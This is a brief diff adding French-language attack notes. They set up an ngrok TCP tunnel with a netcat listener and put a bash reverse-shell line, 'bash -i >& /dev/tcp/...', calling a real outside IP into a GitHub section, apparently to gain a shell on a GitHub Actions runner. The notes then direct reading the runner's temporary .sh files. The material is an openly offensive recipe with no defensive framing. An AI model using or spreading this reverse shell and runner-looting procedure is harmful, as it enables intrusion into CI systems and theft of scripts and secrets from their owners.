@@ -1,0 +1,15 @@
+install ngrok
+-- host
+- terminal
+ngrok tcp 21000 (check port)
+dig ip du ngrok pour récupérer ip
+
+- nouveau terminal
+nc -l 21000
+
+-- github
+TEST
+bash -i >& /dev/tcp/18.156.13.209/15396 0>&1
+
+accéder à : /home/runner/work/_temp
+cat les .sh
